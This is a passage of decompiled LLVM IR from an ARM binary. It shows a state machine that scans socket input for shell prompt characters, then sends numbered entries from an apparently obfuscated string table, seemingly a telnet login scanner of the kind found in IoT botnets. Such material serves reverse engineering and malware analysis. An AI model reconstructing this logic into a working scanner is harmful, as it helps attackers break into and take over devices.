  %v3_11868 = load i8, i8* %v2_11868, align 1
  %v4_11868 = zext i8 %v3_11868 to i32
  store i32 %v4_11868, i32* %r3.global-to-local, align 4
  %v2_1186c = icmp ugt i8 %v3_11868, 61
  store i1 %v2_1186c, i1* %cpsr_c.global-to-local, align 1
  %v7_1186c = icmp eq i8 %v3_11868, 62
  store i1 %v7_1186c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1186c, label %dec_label_pc_11878, label %bb340

bb340:                                            ; preds = %dec_label_pc_11864
  %v3_11870 = icmp ugt i8 %v3_11868, 57
  store i1 %v3_11870, i1* %cpsr_c.global-to-local, align 1
  %v8_11870 = icmp eq i8 %v3_11868, 58
  store i1 %v8_11870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11870, label %dec_label_pc_11878, label %dec_label_pc_1184c

dec_label_pc_11878:                               ; preds = %dec_label_pc_11864, %bb340, %dec_label_pc_11854, %dec_label_pc_1184c
  %v1_11878 = add i32 %v0_11878, 1
  store i32 %v1_11878, i32* @r7, align 4
  %v2_1187c = icmp eq i32 %v1_11878, -1
  store i1 %v2_1187c, i1* %cpsr_c.global-to-local, align 1
  %v7_1187c = icmp eq i32 %v0_11878, -2
  store i1 %v7_1187c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1187c, label %dec_label_pc_11e18, label %dec_label_pc_11884

dec_label_pc_11884:                               ; preds = %dec_label_pc_11e58, %dec_label_pc_11878
  %v0_11884 = phi i32 [ %v0_11e60, %dec_label_pc_11e58 ], [ %v1_11878, %dec_label_pc_11878 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11884 = icmp eq i32 %v0_11884, 0
  store i1 %v2_11884, i1* %cpsr_z.global-to-local, align 1
  %tmp341 = icmp slt i32 %v0_11884, 1
  br i1 %tmp341, label %dec_label_pc_11790, label %dec_label_pc_1188c

dec_label_pc_1188c:                               ; preds = %dec_label_pc_11884
  %v0_1188c = load i32, i32* @r5, align 4
  %v1_1188c = inttoptr i32 %v0_1188c to i32*
  %v2_1188c = load i32, i32* %v1_1188c, align 4
  store i32 %v2_1188c, i32* %r3.global-to-local, align 4
  %v1_11890 = add i32 %v0_1188c, 4
  %v2_11890 = inttoptr i32 %v1_11890 to i32*
  %v3_11890 = load i32, i32* %v2_11890, align 4
  store i32 %v3_11890, i32* %r0.global-to-local, align 4
  %v1_11894 = add i32 %v2_1188c, 13
  %v2_11894 = inttoptr i32 %v1_11894 to i8*
  %v3_11894 = load i8, i8* %v2_11894, align 1
  %v4_11894 = zext i8 %v3_11894 to i32
  store i32 %v4_11894, i32* %r2.global-to-local, align 4
  %v1_11898 = add i32 %v2_1188c, 4
  %v2_11898 = inttoptr i32 %v1_11898 to i32*
  %v3_11898 = load i32, i32* %v2_11898, align 4
  store i32 %v3_11898, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_118a0 = inttoptr i32 %v3_11898 to i32*
  %v5_118a0 = call i32 @send(i32 %v3_11890, i32* %v4_118a0, i32 %v4_11894, i32 16384)
  store i32 %v5_118a0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_118a8 = load i32, i32* @r5, align 4
  %v1_118a8 = add i32 %v0_118a8, 4
  %v2_118a8 = inttoptr i32 %v1_118a8 to i32*
  %v3_118a8 = load i32, i32* %v2_118a8, align 4
  store i32 %v3_118a8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_118b4 = call i32 @send(i32 %v3_118a8, i32* bitcast ([3 x i8]* @global_var_13688.86 to i32*), i32 2, i32 16384)
  store i32 %v5_118b4, i32* %r0.global-to-local, align 4
  %v0_118b8 = load i32, i32* @r5, align 4
  %v1_118b8 = add i32 %v0_118b8, 24
  %v2_118b8 = inttoptr i32 %v1_118b8 to i32*
  %v3_118b8 = load i32, i32* %v2_118b8, align 4
  store i32 %v3_118b8, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_118c0 = add i32 %v0_118b8, 12
  %v3_118c0 = inttoptr i32 %v2_118c0 to i32*
  store i32 5, i32* %v3_118c0, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_118c8:                               ; preds = %dec_label_pc_11684
  %v1_118c8 = add i32 %v0_11684, 24
  %v2_118c8 = inttoptr i32 %v1_118c8 to i32*
  %v3_118c8 = load i32, i32* %v2_118c8, align 4
  store i32 %v3_118c8, i32* %ip.global-to-local, align 4
  %v1_118cc = add i32 %v3_118c8, -1
  store i32 %v1_118cc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_118d0 = icmp eq i32 %v1_118cc, 0
  store i1 %v2_118d0, i1* %cpsr_z.global-to-local, align 1
  %v5_118d4 = icmp sgt i32 %v1_118cc, 0
  br i1 %v5_118d4, label %dec_label_pc_118fc, label %dec_label_pc_11608.backedge.thread

dec_label_pc_118dc:                               ; preds = %bb342
  %v2_118dc = icmp ugt i8 %v3_11900, 35
  store i1 %v2_118dc, i1* %cpsr_c.global-to-local, align 1
  %v7_118dc = icmp eq i8 %v3_11900, 36
  store i1 %v7_118dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_118dc, label %dec_label_pc_11910, label %dec_label_pc_118e4

dec_label_pc_118e4:                               ; preds = %dec_label_pc_118dc
  %v2_118e4 = icmp ugt i8 %v3_11900, 34
  store i1 %v2_118e4, i1* %cpsr_c.global-to-local, align 1
  %v7_118e4 = icmp eq i8 %v3_11900, 35
  store i1 %v7_118e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_118e4, label %dec_label_pc_11910, label %dec_label_pc_118ec

dec_label_pc_118ec:                               ; preds = %dec_label_pc_118e4
  %v2_118ec = icmp ugt i8 %v3_11900, 36
  store i1 %v2_118ec, i1* %cpsr_c.global-to-local, align 1
  %v7_118ec = icmp eq i8 %v3_11900, 37
  store i1 %v7_118ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_118ec, label %dec_label_pc_11910, label %dec_label_pc_118f4

dec_label_pc_118f4:                               ; preds = %dec_label_pc_118ec
  %v1_118f4 = add i32 %v0_11910, -1
  store i32 %v1_118f4, i32* %r0.global-to-local, align 4
  %v2_118f4 = icmp ne i32 %v0_11910, 0
  store i1 %v2_118f4, i1* %cpsr_c.global-to-local, align 1
  %v7_118f4 = icmp eq i32 %v0_11910, 1
  store i1 %v7_118f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_118f4, label %dec_label_pc_11608.backedge.thread465, label %dec_label_pc_118fc

dec_label_pc_118fc:                               ; preds = %dec_label_pc_118c8, %dec_label_pc_118f4
  %v0_11910 = phi i32 [ %v1_118f4, %dec_label_pc_118f4 ], [ %v1_118cc, %dec_label_pc_118c8 ]
  %v2_118fc = add i32 %v0_11910, %v0_11684
  store i32 %v2_118fc, i32* %r3.global-to-local, align 4
  %v1_11900 = add i32 %v2_118fc, 28
  %v2_11900 = inttoptr i32 %v1_11900 to i8*
  %v3_11900 = load i8, i8* %v2_11900, align 1
  %v4_11900 = zext i8 %v3_11900 to i32
  store i32 %v4_11900, i32* %r3.global-to-local, align 4
  %v2_11904 = icmp ugt i8 %v3_11900, 61
  store i1 %v2_11904, i1* %cpsr_c.global-to-local, align 1
  %v7_11904 = icmp eq i8 %v3_11900, 62
  store i1 %v7_11904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11904, label %dec_label_pc_11910, label %bb342

bb342:                                            ; preds = %dec_label_pc_118fc
  %v3_11908 = icmp ugt i8 %v3_11900, 57
  store i1 %v3_11908, i1* %cpsr_c.global-to-local, align 1
  %v8_11908 = icmp eq i8 %v3_11900, 58
  store i1 %v8_11908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11908, label %dec_label_pc_11910, label %dec_label_pc_118dc

dec_label_pc_11910:                               ; preds = %dec_label_pc_118fc, %bb342, %dec_label_pc_118ec, %dec_label_pc_118e4, %dec_label_pc_118dc
  %v1_11910 = add i32 %v0_11910, 1
  store i32 %v1_11910, i32* @r7, align 4
  %v2_11914 = icmp eq i32 %v1_11910, -1
  store i1 %v2_11914, i1* %cpsr_c.global-to-local, align 1
  %v7_11914 = icmp eq i32 %v0_11910, -2
  store i1 %v7_11914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11914, label %dec_label_pc_11608.backedge.thread465, label %dec_label_pc_1191c

dec_label_pc_1191c:                               ; preds = %dec_label_pc_11910
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1191c = icmp eq i32 %v1_11910, 0
  store i1 %v2_1191c, i1* %cpsr_z.global-to-local, align 1
  %tmp343 = icmp slt i32 %v1_11910, 1
  br i1 %tmp343, label %dec_label_pc_11790, label %dec_label_pc_11924

dec_label_pc_11924:                               ; preds = %dec_label_pc_1191c
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11928 = call i32 @function_12280(i32 25)
  store i32 %v2_115a0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_11938 = call i32 @function_1219c(i32 25, i32* %v2_115a8)
  store i32 %v3_11938, i32* %r0.global-to-local, align 4
  %v3_1193c = load i8, i8* %stack_var_-52, align 1
  %v4_1193c = sext i8 %v3_1193c to i32
  store i32 %v4_1193c, i32* %r2.global-to-local, align 4
  store i32 %v3_11938, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11948 = load i32, i32* @r5, align 4
  %v1_11948 = add i32 %v0_11948, 4
  %v2_11948 = inttoptr i32 %v1_11948 to i32*
  %v3_11948 = load i32, i32* %v2_11948, align 4
  store i32 %v3_11948, i32* %r0.global-to-local, align 4
  %v4_1194c = inttoptr i32 %v3_11938 to i32*
  %v5_1194c = call i32 @send(i32 %v3_11948, i32* %v4_1194c, i32 %v4_1193c, i32 16384)
  store i32 %v5_1194c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1195c = load i32, i32* @r5, align 4
  %v1_1195c = add i32 %v0_1195c, 4
  %v2_1195c = inttoptr i32 %v1_1195c to i32*
  %v3_1195c = load i32, i32* %v2_1195c, align 4
  store i32 %v3_1195c, i32* %r0.global-to-local, align 4
  %v5_11960 = call i32 @send(i32 %v3_1195c, i32* bitcast ([3 x i8]* @global_var_13688.86 to i32*), i32 2, i32 16384)
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11968 = call i32 @function_121c8(i32 25)
  store i32 %v1_11968, i32* %r0.global-to-local, align 4
  %v0_1196c = load i32, i32* @r5, align 4
  %v1_1196c = add i32 %v0_1196c, 24
  %v2_1196c = inttoptr i32 %v1_1196c to i32*
  %v3_1196c = load i32, i32* %v2_1196c, align 4
  store i32 %v3_1196c, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_11974 = add i32 %v0_1196c, 12
  %v3_11974 = inttoptr i32 %v2_11974 to i32*
  store i32 6, i32* %v3_11974, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_1197c:                               ; preds = %dec_label_pc_11684
  %v1_1197c = add i32 %v0_11684, 24
  %v2_1197c = inttoptr i32 %v1_1197c to i32*
  %v3_1197c = load i32, i32* %v2_1197c, align 4
  store i32 %v3_1197c, i32* %ip.global-to-local, align 4
  %v1_11980 = add i32 %v3_1197c, -1
  store i32 %v1_11980, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11984 = icmp eq i32 %v1_11980, 0
  store i1 %v2_11984, i1* %cpsr_z.global-to-local, align 1
  %v5_11988 = icmp sgt i32 %v1_11980, 0
  br i1 %v5_11988, label %dec_label_pc_11a6c, label %dec_label_pc_11608.backedge.thread

dec_label_pc_11a4c:                               ; preds = %bb344
  %v2_11a4c = icmp ugt i8 %v3_11a70, 35
  store i1 %v2_11a4c, i1* %cpsr_c.global-to-local, align 1
  %v7_11a4c = icmp eq i8 %v3_11a70, 36
  store i1 %v7_11a4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a4c, label %dec_label_pc_11a80, label %dec_label_pc_11a54

dec_label_pc_11a54:                               ; preds = %dec_label_pc_11a4c
  %v2_11a54 = icmp ugt i8 %v3_11a70, 34
  store i1 %v2_11a54, i1* %cpsr_c.global-to-local, align 1
  %v7_11a54 = icmp eq i8 %v3_11a70, 35
  store i1 %v7_11a54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a54, label %dec_label_pc_11a80, label %dec_label_pc_11a5c

dec_label_pc_11a5c:                               ; preds = %dec_label_pc_11a54
  %v2_11a5c = icmp ugt i8 %v3_11a70, 36
  store i1 %v2_11a5c, i1* %cpsr_c.global-to-local, align 1
  %v7_11a5c = icmp eq i8 %v3_11a70, 37
  store i1 %v7_11a5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a5c, label %dec_label_pc_11a80, label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a5c
  %v1_11a64 = add i32 %v0_11a80, -1
  store i32 %v1_11a64, i32* %r0.global-to-local, align 4
  %v2_11a64 = icmp ne i32 %v0_11a80, 0
  store i1 %v2_11a64, i1* %cpsr_c.global-to-local, align 1
  %v7_11a64 = icmp eq i32 %v0_11a80, 1
  store i1 %v7_11a64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a64, label %dec_label_pc_11608.backedge.thread465, label %dec_label_pc_11a6c

dec_label_pc_11a6c:                               ; preds = %dec_label_pc_1197c, %dec_label_pc_11a64
  %v0_11a80 = phi i32 [ %v1_11a64, %dec_label_pc_11a64 ], [ %v1_11980, %dec_label_pc_1197c ]
  %v2_11a6c = add i32 %v0_11a80, %v0_11684
  store i32 %v2_11a6c, i32* %r3.global-to-local, align 4
  %v1_11a70 = add i32 %v2_11a6c, 28
  %v2_11a70 = inttoptr i32 %v1_11a70 to i8*
  %v3_11a70 = load i8, i8* %v2_11a70, align 1
  %v4_11a70 = zext i8 %v3_11a70 to i32
  store i32 %v4_11a70, i32* %r3.global-to-local, align 4
  %v2_11a74 = icmp ugt i8 %v3_11a70, 61
  store i1 %v2_11a74, i1* %cpsr_c.global-to-local, align 1
  %v7_11a74 = icmp eq i8 %v3_11a70, 62
  store i1 %v7_11a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a74, label %dec_label_pc_11a80, label %bb344

bb344:                                            ; preds = %dec_label_pc_11a6c
  %v3_11a78 = icmp ugt i8 %v3_11a70, 57
  store i1 %v3_11a78, i1* %cpsr_c.global-to-local, align 1
  %v8_11a78 = icmp eq i8 %v3_11a70, 58
  store i1 %v8_11a78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11a78, label %dec_label_pc_11a80, label %dec_label_pc_11a4c

dec_label_pc_11a80:                               ; preds = %dec_label_pc_11a6c, %bb344, %dec_label_pc_11a5c, %dec_label_pc_11a54, %dec_label_pc_11a4c
  %v1_11a80 = add i32 %v0_11a80, 1
  store i32 %v1_11a80, i32* @r7, align 4
  %v2_11a84 = icmp eq i32 %v1_11a80, -1
  store i1 %v2_11a84, i1* %cpsr_c.global-to-local, align 1
  %v7_11a84 = icmp eq i32 %v0_11a80, -2
  store i1 %v7_11a84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a84, label %dec_label_pc_11608.backedge.thread465, label %dec_label_pc_11a8c

dec_label_pc_11a8c:                               ; preds = %dec_label_pc_11a80
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11a8c = icmp eq i32 %v1_11a80, 0
  store i1 %v2_11a8c, i1* %cpsr_z.global-to-local, align 1
  %tmp345 = icmp slt i32 %v1_11a80, 1
  br i1 %tmp345, label %dec_label_pc_11790, label %dec_label_pc_11a94

dec_label_pc_11a94:                               ; preds = %dec_label_pc_11a8c
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_11a98 = call i32 @function_12280(i32 26)
  store i32 %v2_115b4, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_11aa8 = call i32 @function_1219c(i32 26, i32* nonnull %stack_var_-56)
  store i32 %v3_11aa8, i32* %r0.global-to-local, align 4
  %v3_11aac = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11aac, i32* %r2.global-to-local, align 4
  store i32 %v3_11aa8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11ab8 = load i32, i32* @r5, align 4
  %v1_11ab8 = add i32 %v0_11ab8, 4
  %v2_11ab8 = inttoptr i32 %v1_11ab8 to i32*
  %v3_11ab8 = load i32, i32* %v2_11ab8, align 4
  store i32 %v3_11ab8, i32* %r0.global-to-local, align 4
  %v4_11abc = inttoptr i32 %v3_11aa8 to i32*
  %v5_11abc = call i32 @send(i32 %v3_11ab8, i32* %v4_11abc, i32 %v3_11aac, i32 16384)
  store i32 %v5_11abc, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11acc = load i32, i32* @r5, align 4
  %v1_11acc = add i32 %v0_11acc, 4
  %v2_11acc = inttoptr i32 %v1_11acc to i32*
  %v3_11acc = load i32, i32* %v2_11acc, align 4
  store i32 %v3_11acc, i32* %r0.global-to-local, align 4
  %v5_11ad0 = call i32 @send(i32 %v3_11acc, i32* bitcast ([3 x i8]* @global_var_13688.86 to i32*), i32 2, i32 16384)
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_11ad8 = call i32 @function_121c8(i32 26)
  store i32 %v1_11ad8, i32* %r0.global-to-local, align 4
  %v0_11adc = load i32, i32* @r5, align 4
  %v1_11adc = add i32 %v0_11adc, 24
  %v2_11adc = inttoptr i32 %v1_11adc to i32*
  %v3_11adc = load i32, i32* %v2_11adc, align 4
  store i32 %v3_11adc, i32* %ip.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v2_11ae4 = add i32 %v0_11adc, 12
  %v3_11ae4 = inttoptr i32 %v2_11ae4 to i32*
  store i32 7, i32* %v3_11ae4, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11684
  %v1_11aec = add i32 %v0_11684, 24
  %v2_11aec = inttoptr i32 %v1_11aec to i32*
  %v3_11aec = load i32, i32* %v2_11aec, align 4
  store i32 %v3_11aec, i32* %ip.global-to-local, align 4
  %v1_11af0 = add i32 %v3_11aec, -1
  store i32 %v1_11af0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11af4 = icmp eq i32 %v1_11af0, 0
  store i1 %v2_11af4, i1* %cpsr_z.global-to-local, align 1
  %v5_11af8 = icmp sgt i32 %v1_11af0, 0
  br i1 %v5_11af8, label %dec_label_pc_11b20, label %dec_label_pc_11608.backedge.thread

dec_label_pc_11b00:                               ; preds = %bb346
  %v2_11b00 = icmp ugt i8 %v3_11b24, 35
  store i1 %v2_11b00, i1* %cpsr_c.global-to-local, align 1
  %v7_11b00 = icmp eq i8 %v3_11b24, 36
  store i1 %v7_11b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b00, label %dec_label_pc_11b34, label %dec_label_pc_11b08

dec_label_pc_11b08:                               ; preds = %dec_label_pc_11b00
  %v2_11b08 = icmp ugt i8 %v3_11b24, 34
  store i1 %v2_11b08, i1* %cpsr_c.global-to-local, align 1
  %v7_11b08 = icmp eq i8 %v3_11b24, 35
  store i1 %v7_11b08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b08, label %dec_label_pc_11b34, label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11b08
  %v2_11b10 = icmp ugt i8 %v3_11b24, 36
  store i1 %v2_11b10, i1* %cpsr_c.global-to-local, align 1
  %v7_11b10 = icmp eq i8 %v3_11b24, 37
  store i1 %v7_11b10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b10, label %dec_label_pc_11b34, label %dec_label_pc_11b18

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11b10
  %v1_11b18 = add i32 %v0_11b34, -1
  store i32 %v1_11b18, i32* %r0.global-to-local, align 4
  %v2_11b18 = icmp ne i32 %v0_11b34, 0
  store i1 %v2_11b18, i1* %cpsr_c.global-to-local, align 1
  %v7_11b18 = icmp eq i32 %v0_11b34, 1
  store i1 %v7_11b18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b18, label %dec_label_pc_11608.backedge.thread465, label %dec_label_pc_11b20

dec_label_pc_11b20:                               ; preds = %dec_label_pc_11aec, %dec_label_pc_11b18
  %v0_11b34 = phi i32 [ %v1_11b18, %dec_label_pc_11b18 ], [ %v1_11af0, %dec_label_pc_11aec ]
  %v2_11b20 = add i32 %v0_11b34, %v0_11684
  store i32 %v2_11b20, i32* %r3.global-to-local, align 4
  %v1_11b24 = add i32 %v2_11b20, 28
  %v2_11b24 = inttoptr i32 %v1_11b24 to i8*
  %v3_11b24 = load i8, i8* %v2_11b24, align 1
  %v4_11b24 = zext i8 %v3_11b24 to i32
  store i32 %v4_11b24, i32* %r3.global-to-local, align 4
  %v2_11b28 = icmp ugt i8 %v3_11b24, 61
  store i1 %v2_11b28, i1* %cpsr_c.global-to-local, align 1
  %v7_11b28 = icmp eq i8 %v3_11b24, 62
  store i1 %v7_11b28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b28, label %dec_label_pc_11b34, label %bb346

bb346:                                            ; preds = %dec_label_pc_11b20
  %v3_11b2c = icmp ugt i8 %v3_11b24, 57
  store i1 %v3_11b2c, i1* %cpsr_c.global-to-local, align 1
  %v8_11b2c = icmp eq i8 %v3_11b24, 58
  store i1 %v8_11b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11b2c, label %dec_label_pc_11b34, label %dec_label_pc_11b00

dec_label_pc_11b34:                               ; preds = %dec_label_pc_11b20, %bb346, %dec_label_pc_11b10, %dec_label_pc_11b08, %dec_label_pc_11b00
  %v1_11b34 = add i32 %v0_11b34, 1
  store i32 %v1_11b34, i32* @r7, align 4
  %v2_11b38 = icmp eq i32 %v1_11b34, -1
  store i1 %v2_11b38, i1* %cpsr_c.global-to-local, align 1
  %v7_11b38 = icmp eq i32 %v0_11b34, -2
  store i1 %v7_11b38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b38, label %dec_label_pc_11608.backedge.thread465, label %dec_label_pc_11b40

dec_label_pc_11b40:                               ; preds = %dec_label_pc_11b34
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11b40 = icmp eq i32 %v1_11b34, 0
  store i1 %v2_11b40, i1* %cpsr_z.global-to-local, align 1
  %tmp347 = icmp slt i32 %v1_11b34, 1
  br i1 %tmp347, label %dec_label_pc_11790, label %dec_label_pc_11b48

dec_label_pc_11b48:                               ; preds = %dec_label_pc_11b40
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_11b4c = call i32 @function_12280(i32 27)
  store i32 %v2_115a0, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_11b5c = call i32 @function_1219c(i32 27, i32* %v2_115a8)
  store i32 %v3_11b5c, i32* %r0.global-to-local, align 4
  %v3_11b60 = load i8, i8* %stack_var_-52, align 1
  %v4_11b60 = sext i8 %v3_11b60 to i32
  store i32 %v4_11b60, i32* %r2.global-to-local, align 4
  store i32 %v3_11b5c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11b6c = load i32, i32* @r5, align 4
  %v1_11b6c = add i32 %v0_11b6c, 4
  %v2_11b6c = inttoptr i32 %v1_11b6c to i32*
  %v3_11b6c = load i32, i32* %v2_11b6c, align 4
  store i32 %v3_11b6c, i32* %r0.global-to-local, align 4
  %v4_11b70 = inttoptr i32 %v3_11b5c to i32*
  %v5_11b70 = call i32 @send(i32 %v3_11b6c, i32* %v4_11b70, i32 %v4_11b60, i32 16384)
  store i32 %v5_11b70, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11b80 = load i32, i32* @r5, align 4
  %v1_11b80 = add i32 %v0_11b80, 4
  %v2_11b80 = inttoptr i32 %v1_11b80 to i32*
  %v3_11b80 = load i32, i32* %v2_11b80, align 4
  store i32 %v3_11b80, i32* %r0.global-to-local, align 4
  %v5_11b84 = call i32 @send(i32 %v3_11b80, i32* bitcast ([3 x i8]* @global_var_13688.86 to i32*), i32 2, i32 16384)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_11b8c = call i32 @function_121c8(i32 27)
  store i32 %v1_11b8c, i32* %r0.global-to-local, align 4
  %v0_11b90 = load i32, i32* @r5, align 4
  %v1_11b90 = add i32 %v0_11b90, 24
  %v2_11b90 = inttoptr i32 %v1_11b90 to i32*
  %v3_11b90 = load i32, i32* %v2_11b90, align 4
  store i32 %v3_11b90, i32* %ip.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_11b98 = add i32 %v0_11b90, 12
  %v3_11b98 = inttoptr i32 %v2_11b98 to i32*
  store i32 9, i32* %v3_11b98, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11ba0:                               ; preds = %dec_label_pc_11684
  %v1_11ba0 = add i32 %v0_11684, 24
  %v2_11ba0 = inttoptr i32 %v1_11ba0 to i32*
  %v3_11ba0 = load i32, i32* %v2_11ba0, align 4
  store i32 %v3_11ba0, i32* %ip.global-to-local, align 4
  %v1_11ba4 = add i32 %v3_11ba0, -1
  store i32 %v1_11ba4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11ba8 = icmp eq i32 %v1_11ba4, 0
  store i1 %v2_11ba8, i1* %cpsr_z.global-to-local, align 1
  %v5_11bac = icmp sgt i32 %v1_11ba4, 0
  br i1 %v5_11bac, label %dec_label_pc_11bd4, label %dec_label_pc_11608.backedge.thread

dec_label_pc_11bb4:                               ; preds = %bb348
  %v2_11bb4 = icmp ugt i8 %v3_11bd8, 35
  store i1 %v2_11bb4, i1* %cpsr_c.global-to-local, align 1
  %v7_11bb4 = icmp eq i8 %v3_11bd8, 36
  store i1 %v7_11bb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11bb4, label %dec_label_pc_11be8, label %dec_label_pc_11bbc

dec_label_pc_11bbc:                               ; preds = %dec_label_pc_11bb4
  %v2_11bbc = icmp ugt i8 %v3_11bd8, 34
  store i1 %v2_11bbc, i1* %cpsr_c.global-to-local, align 1
  %v7_11bbc = icmp eq i8 %v3_11bd8, 35
  store i1 %v7_11bbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11bbc, label %dec_label_pc_11be8, label %dec_label_pc_11bc4

dec_label_pc_11bc4:                               ; preds = %dec_label_pc_11bbc
  %v2_11bc4 = icmp ugt i8 %v3_11bd8, 36
  store i1 %v2_11bc4, i1* %cpsr_c.global-to-local, align 1
  %v7_11bc4 = icmp eq i8 %v3_11bd8, 37
  store i1 %v7_11bc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11bc4, label %dec_label_pc_11be8, label %dec_label_pc_11bcc

dec_label_pc_11bcc:                               ; preds = %dec_label_pc_11bc4
  %v1_11bcc = add i32 %v0_11be8, -1
  store i32 %v1_11bcc, i32* %r0.global-to-local, align 4
  %v2_11bcc = icmp ne i32 %v0_11be8, 0
  store i1 %v2_11bcc, i1* %cpsr_c.global-to-local, align 1
  %v7_11bcc = icmp eq i32 %v0_11be8, 1
  store i1 %v7_11bcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11bcc, label %dec_label_pc_11608.backedge.thread465, label %dec_label_pc_11bd4

dec_label_pc_11bd4:                               ; preds = %dec_label_pc_11ba0, %dec_label_pc_11bcc
  %v0_11be8 = phi i32 [ %v1_11bcc, %dec_label_pc_11bcc ], [ %v1_11ba4, %dec_label_pc_11ba0 ]
  %v2_11bd4 = add i32 %v0_11be8, %v0_11684
  store i32 %v2_11bd4, i32* %r3.global-to-local, align 4
  %v1_11bd8 = add i32 %v2_11bd4, 28
  %v2_11bd8 = inttoptr i32 %v1_11bd8 to i8*
  %v3_11bd8 = load i8, i8* %v2_11bd8, align 1
  %v4_11bd8 = zext i8 %v3_11bd8 to i32
  store i32 %v4_11bd8, i32* %r3.global-to-local, align 4
  %v2_11bdc = icmp ugt i8 %v3_11bd8, 61
  store i1 %v2_11bdc, i1* %cpsr_c.global-to-local, align 1
  %v7_11bdc = icmp eq i8 %v3_11bd8, 62
  store i1 %v7_11bdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11bdc, label %dec_label_pc_11be8, label %bb348

bb348:                                            ; preds = %dec_label_pc_11bd4
  %v3_11be0 = icmp ugt i8 %v3_11bd8, 57
  store i1 %v3_11be0, i1* %cpsr_c.global-to-local, align 1
  %v8_11be0 = icmp eq i8 %v3_11bd8, 58
  store i1 %v8_11be0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11be0, label %dec_label_pc_11be8, label %dec_label_pc_11bb4

